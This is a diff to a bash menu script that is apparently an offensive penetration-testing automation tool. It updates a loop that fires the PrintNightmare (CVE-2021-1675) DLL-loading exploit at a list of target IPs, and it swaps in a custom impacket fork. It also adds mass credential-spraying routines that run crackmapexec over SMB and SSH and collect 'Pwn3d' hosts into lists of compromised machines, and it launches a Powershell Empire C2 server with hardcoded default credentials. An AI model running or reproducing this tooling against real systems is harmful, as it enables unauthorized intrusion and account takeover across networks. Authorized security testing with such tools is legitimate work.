@@ -1198,7 +1198,7 @@ EOF
 	echo -e "\E[1;34m::::: \e[97mCreate DLL Payload For PrintNightmare & Host It On Your SMB Share\E[1;34m:::::"
 	echo -e "\E[1;34m::::: \e[97mStart Your Listener Of Choice (Covenant Preferred)\E[1;34m:::::"
 	inputfile=~/ATAT/MSF_targets.txt
-		read -p 'Set Domain: ' userdomain; read -p 'Set Username: ' username; read -p 'Set Password (NOT MASKED!): ' userpass; read -p 'Set Full SMB Share Path To Payload (ex. \\PCNAME\Share\Payload.dll): ' ATTACKERPCSharePayload;
+		read -p 'Set Domain: ' userdomain; read -p 'Set Username: ' username; read -p 'Set Password (NOT MASKED!): ' userpass; read -p 'Set Full SMB Share Path To Payload (ex. \\\\PCNAME\\Share\\Payload.dll): ' ATTACKERPCSharePayload;
 	cd ~/CVE-2021-1675/
 	for IP in $(cat $inputfile)
 	do
@@ -1888,7 +1888,9 @@ EOF
 	echo -e "\E[1;34m::::: \e[97mInstall Bloodhound via the instructions here: https://github.com/BloodHoundAD/BloodHound/wiki/Getting-started \E[1;34m:::::"
 			;;
 		"PrintNightmare Install")
+		read -p "This Will UNINSTALL impacket & Replace It With A Custom Version!! Hit \"Enter\" To Continue or CTRL + C To Stop" enter
 			git clone https://github.com/cube0x0/CVE-2021-1675 ~/CVE-2021-1675
+			pip3 uninstall impacket
 			cd ~/CVE-2021-1675
 			git clone https://github.com/cube0x0/impacket
 			cd impacket
@@ -2432,8 +2434,8 @@ done
 "13" | "13" )
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mPrivilege Escalation Methods \E[1;34m:::::"
-  PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
-options=("BeRoot Windows" "BeRoot Linux" "LinEnum" "Hashcat Password Recovery" "Kernelpop Privilege Escalation Automation" "Main Menu" "Quit" )
+  PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
+options=("BeRoot Windows" "BeRoot Linux" "LinEnum" "Hashcat Password Recovery" "Kernelpop Privilege Escalation Automation" "Windows AD Account Validation Tester" "SSH Account Validation Tester - BETA" "Main Menu" "Quit" )
 select opt in "${options[@]}"
 do
     case $opt in
@@ -2542,6 +2544,33 @@ select opt in "${options[@]}"
     echo -e "\E[1;34m::::: \e[97mchmod +x kernelpop (or renamed file name) On Target \E[1;34m:::::"
     echo -e "\E[1;34m::::: \e[97mRun ./kernelpop (or renamed file name) On Target & Follow Instructions for Privilege Escalation \E[1;34m:::::"
     		;;
+        "Windows AD Account Validation Tester")
+        echo -e "\E[1;34m::::: \e[97mThis Script Will Easily Test Thousands of Targets (Not Ultra Fast) \E[1;34m:::::" 
+        echo -e "\E[1;34m::::: \e[97mSomething Few Other Tools Can Do Gracefully \E[1;34m:::::"
+        echo -e "\E[1;34m::::: \e[97mMany Tools Will Crash When You Attempt To Input Thousands Of Targets \E[1;34m:::::"
+            read -p 'Set Domain: ' userdomain; read -p 'Set Username: ' username; read -p 'Set Password (THIS WILL SHOW IN PLAINTEXT IN TERMINAL!): ' userpass;
+                inputfile=~/ATAT/MSF_targets.txt
+                for IP in $(cat $inputfile)
+                do
+                crackmapexec smb $IP -u $username -p $userpass -d $userdomain | tee -a AD_Cred_Tester_Output.txt
+                done
+                grep -E 'Pwn3d' AD_Cred_Tester_Output.txt > Compromised_SMB_Machines.txt
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Compromised_SMB_Machines.txt for Details! \E[1;34m:::::"
+            ;;
+        "SSH Account Validation Tester - BETA")
+        echo -e "\E[1;34m::::: \e[97mThis Script Will Easily Test Thousands of Targets (Not Ultra Fast) \E[1;34m:::::" 
+        echo -e "\E[1;34m::::: \e[97mSomething Few Other Tools Can Do Gracefully \E[1;34m:::::"
+        echo -e "\E[1;34m::::: \e[97mMany Tools Will Crash When You Attempt To Input Thousands Of Targets \E[1;34m:::::"
+        echo -e "\E[1;34m::::: \e[97m*WARNING* This Will FAIL If The Password Has a Backslash In It! \E[1;34m:::::"
+            read -p 'Set Username: ' username; read -p 'Set Password (THIS WILL SHOW IN PLAINTEXT IN TERMINAL!) - *WARNING* This Will FAIL If The Password Has a Backslash In It!: ' userpass;
+                inputfile=~/ATAT/MSF_targets.txt
+                for IP in $(cat $inputfile)
+                do
+                crackmapexec ssh $IP -u $username -p $userpass | tee -a SSH_Cred_Tester_Output.txt
+                done
+                grep -E 'Pwn3d' SSH_Cred_Tester_Output.txt > Compromised_SSH_Machines.txt
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Compromised_SSH_Machines.txt for Details! \E[1;34m:::::"
+            ;;		
 		"Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -2618,7 +2647,8 @@ do
         "Step 1 - Launch Powershell Empire & RESTful API")
     # Start the Empire console & RESTful API
 	echo -e "\E[1;34m::::: \e[97mLaunching Powershell Empire & RESTful API \E[1;34m:::::"
-	cd ~/Empire && python3 empire --rest --username empireadmin --password Password123
+#	cd ~/Empire && python3 empire --rest --username empireadmin --password Password123 -- OLD SERVER LAUNCH CMD
+    cd ~/Empire &&  ./ps-empire server
 	#outputfile=~/ATAT/PSE_perm_token.txt
     #read -p 'Set PSE C2 (LHOST or localhost): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT or 1337): ' userport;
     #curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/admin/login -X POST -d '{"username":"'empireadmin'", "password":"'Password123'"}' | tee ~/ATAT/PSE_session_token_pre.txt
@@ -2629,7 +2659,7 @@ do
     echo -e "\E[1;34m::::: \e[97mLaunching Starkiller GUI \E[1;34m:::::"
     echo -e "\E[1;34m::::: \e[97mEnter localhost:1337 (or C2IP:PORT) In Name Field Of Starkiller GUI \E[1;34m:::::"
     echo -e "\E[1;34m::::: \e[97mEnter empireadmin In Username Field Of Starkiller GUI \E[1;34m:::::"
-    echo -e "\E[1;34m::::: \e[97mEnter Password123 In Password Field Of Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter password123 In Password Field Of Starkiller GUI \E[1;34m:::::"
     /root/starkiller-1.2.2.AppImage --no-sandbox
        	    ;;
     	#"Step 2b - Launch Starkiller GUI In Kali (Optional)")
@@ -2846,6 +2876,10 @@ done
   rm ~/ATAT/SSLScan_nmap_results.txt
   rm ~/ATAT/~SSLScan_Results.txt
   rm ~/ATAT/Open_Ports.txt
+  rm ~/ATAT/AD_Cred_Tester_Output.txt
+  rm ~/ATAT/Compromised_SMB_Machines.txt
+  rm ~/ATAT/SSH_Cred_Tester_Output.txt
+  rm ~/ATAT/Compromised_SSH_Machines.txt
   ~/ATAT/ATAT.sh
 
 ;;
